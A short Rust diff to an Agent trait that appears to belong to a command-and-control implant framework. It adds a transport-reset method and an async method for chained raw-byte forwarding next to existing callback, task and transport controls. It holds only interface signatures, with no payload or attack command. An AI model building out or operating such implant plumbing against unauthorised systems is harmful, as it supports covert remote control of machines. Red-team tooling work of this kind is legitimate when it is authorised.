@@ -11,6 +11,7 @@ pub enum Context {
     ShellTask(ShellTaskContext),
 }
 
+#[async_trait::async_trait]
 pub trait Agent: Send + Sync {
     // Interactivity
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String>;
@@ -39,6 +40,7 @@ pub trait Agent: Send + Sync {
     fn get_config(&self) -> Result<BTreeMap<String, String>, String>;
     fn get_transport(&self) -> Result<String, String>;
     fn set_transport(&self, transport: String) -> Result<(), String>;
+    fn reset_transport(&self) -> Result<(), String>;
     fn list_transports(&self) -> Result<Vec<String>, String>;
     fn get_callback_interval(&self) -> Result<u64, String>;
     fn set_callback_interval(&self, interval: u64) -> Result<(), String>;
@@ -52,4 +54,12 @@ pub trait Agent: Send + Sync {
     // Task Management
     fn list_tasks(&self) -> Result<Vec<c2::Task>, String>;
     fn stop_task(&self, task_id: i64) -> Result<(), String>;
+
+    // Chained transport forwarding
+    async fn forward_raw(
+        &self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> Result<(), String>;
 }
